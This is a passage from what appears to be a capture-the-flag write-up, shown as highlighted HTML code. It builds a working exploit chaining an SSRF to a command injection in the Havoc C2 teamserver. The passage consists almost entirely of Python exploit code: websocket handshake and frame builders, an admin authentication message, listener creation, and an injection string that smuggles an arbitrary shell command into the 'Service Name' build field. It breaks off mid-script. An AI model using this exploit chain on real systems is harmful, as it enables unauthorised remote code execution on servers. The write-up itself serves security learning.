class="nf">print</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()))</span> </code></pre></div></div> <p>The second will create a listener to build an agent for:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Headers</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">HostHeader</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostRotation</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">round-robin</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Hosts</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortConn</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Protocol</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Https</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Proxy Enabled</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Secure</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Status</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">online</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Uris</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">UserAgent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><span class="sh">"</span><span class="p">},</span><span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span><span class="mi">1</span><span class="p">},</span><span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">08:39:18</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span> <span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> </code></pre></div></div> <p>The third one is to run the injection:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">$ </span><span class="sh">"</span><span class="p">)</span> <span class="n">injection</span> <span class="o">=</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\\\\\\"</span><span class="s"> -mbla; </span><span class="sh">"""</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> 1&gt;&amp;2 &amp;&amp; false #</span><span class="sh">"""</span> <span class="c1"># Command injection in demon compilation command </span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">AgentType</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Demon</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Arch</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">x64</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Config</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">{</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Amsi/Etw Patch</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Indirect Syscall</span><span class="se">\"</span><span class="s">: false,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Injection</span><span class="se">\"</span><span class="s">: {</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Alloc</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Execute</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Spawn32</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">SysWOW64</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Spawn64</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"\n</span><span class="s"> },</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Jitter</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Proxy Loading</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None (LdrLoadDll)</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Service Name</span><span class="se">\"</span><span class="s">:</span><span class="se">\"</span><span class="sh">"</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">2</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep Jmp Gadget</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep Technique</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">WaitForSingleObjectEx</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Stack Duplication</span><span class="se">\"</span><span class="s">: false</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Format</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Windows Service Exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Listener</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:39:04</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span> <span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> </code></pre></div></div> <p>There is code in the POC to process the results and print it, but I’m going to focus on getting RCE.</p> <h3 id="create-exploit">Create Exploit</h3> <h4 id="strategy-1">Strategy</h4> <p>If I can set up this websocket connection over the SSRF and send three messages into it, I should get RCE. I’ll need to generate two functions. One to generate the HTTP GET request to initiate the websocket connection, and then one to generate messages to the websocket.</p> <p>I’ll make a copy of the SSRF POC and remove the last three lines where it sends a request to <code class="language-plaintext highlighter-rouge">/vulnerable</code> on the given host:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">GET /vulnerable HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: www.example.com</span><span class="se">\r\n</span><span class="s">Connection: close</span><span class="se">\r\n\r\n</span><span class="sh">"</span> <span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">request_data</span><span class="p">)</span> <span class="nf">print</span><span class="p">(</span><span class="nf">read_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span> </code></pre></div></div> <h4 id="initiate-websocket">Initiate Websocket</h4> <p>ChatGPT is actually pretty good at giving me what I need here:</p> <picture> <source type="image/webp" srcset="/img/image-20250124150846210.webp" /> <img loading="lazy" src="/img/image-20250124150846210.png" alt="image-20250124150846210" class="include_image " /> </picture> <p>My function looks like:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">create_websocket_init_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span> <span class="n">websocket_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">randombytes12345</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span> <span class="n">request</span> <span class="o">=</span> <span class="p">(</span> <span class="sa">f</span><span class="sh">"</span><span class="s">GET </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> HTTP/1.1</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Upgrade: websocket</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Connection: Upgrade</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Sec-WebSocket-Key: </span><span class="si">{</span><span class="n">websocket_key</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Sec-WebSocket-Version: 13</span><span class="se">\r\n</span><span class="sh">"</span> <span class="sa">f</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span> <span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="k">return</span> <span class="n">request</span> </code></pre></div></div> <p>And I’ll use this to initiate the websocket at the end of the exploit:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">init_ws_request</span> <span class="o">=</span> <span class="nf">create_websocket_init_req</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">/havoc/</span><span class="sh">'</span><span class="p">)</span> <span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">init_ws_request</span><span class="p">)</span> </code></pre></div></div> <h4 id="generate-frame">Generate Frame</h4> <p>Now I need to send messages or frames into the socket. ChatGPT is really nice here, helping me to generate this function:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">message</span><span class="p">):</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">message</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span> <span class="n">payload_length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="n">first_byte</span> <span class="o">=</span> <span class="mb">0b10000001</span> <span class="c1"># Binary: FIN = 1, Opcode = 1 </span> <span class="k">if</span> <span class="n">payload_length</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">:</span> <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="n">payload_length</span> <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BB</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">)</span> <span class="k">elif</span> <span class="n">payload_length</span> <span class="o">&lt;=</span> <span class="mi">65535</span><span class="p">:</span> <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="mi">126</span> <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BBH</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">)</span> <span class="k">else</span><span class="p">:</span> <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="mi">127</span> <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BBQ</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">)</span> <span class="n">masking_key</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randbytes</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">frame</span> <span class="o">+=</span> <span class="n">masking_key</span> <span class="n">masked_payload</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">masking_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">payload_length</span><span class="p">))</span> <span class="n">frame</span> <span class="o">+=</span> <span class="n">masked_payload</span> <span class="k">return</span> <span class="n">frame</span> </code></pre></div></div> <h4 id="sending-messages">Sending Messages</h4> <p>The first message is the authentication message. I’ll add a couple of arguments to the script to read in the username, password, and command:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">-U</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--admin-username</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Username for admin auth</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">-P</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--password</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Password for admin auth</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--cmd</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Command to run</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> </code></pre></div></div> <p>I’ll copy the payload from the RCE POC and pass it to the function to generate websocket frames:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># auth </span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha3_256</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:40:17</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span> <span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span> </code></pre></div></div> <p>The next frame is creating some kind of listener. I’ll only need to update the variable name holding the username at the end:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># listener </span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Headers</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">HostHeader</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostRotation</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">round-robin</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Hosts</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortConn</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Protocol</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Https</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Proxy Enabled</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Secure</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Status</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">online</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Uris</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">UserAgent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><span class="sh">"</span><span class="p">},</span><span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span><span class="mi">1</span><span class="p">},</span><span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">08:39:18</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span> <span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span> </code></pre></div></div> <p>Finally, the command injection message. I’ll use the code from the POC again, updating it to take <code class="language-plaintext highlighter-rouge">args.cmd</code>:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># injection </span><span class="n">injection</span> <span class="o">=</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\\\\\\"</span><span class="s"> -mbla; </span><span class="sh">"""</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> 1&gt;&amp;2 &amp;&amp; false #</span><span class="sh">"""</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">AgentType</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Demon</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Arch</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">x64</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Config</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">{</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Amsi/Etw Patch</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Indirect Syscall</span><span class="se">\"</span><span class="s">: false,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Injection</span><span class="se">\"</span><span class="s">: {</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Alloc</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Execute</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Spawn32</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">SysWOW64</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Spawn64</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"\n</span><span class="s"> },</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Jitter</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Proxy Loading</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None (LdrLoadDll)</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Service Name</span><span class="se">\"</span><span class="s">:</span><span class="se">\"</span><span class="sh">"</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">2</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep Jmp Gadget</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Sleep Technique</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">WaitForSingleObjectEx</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s"> </span><span class="se">\"</span><span class="s">Stack Duplication</span><span class="se">\"</span><span class="s">: false</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Format</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Windows Service Exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Listener</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:39:04</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span> <span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span 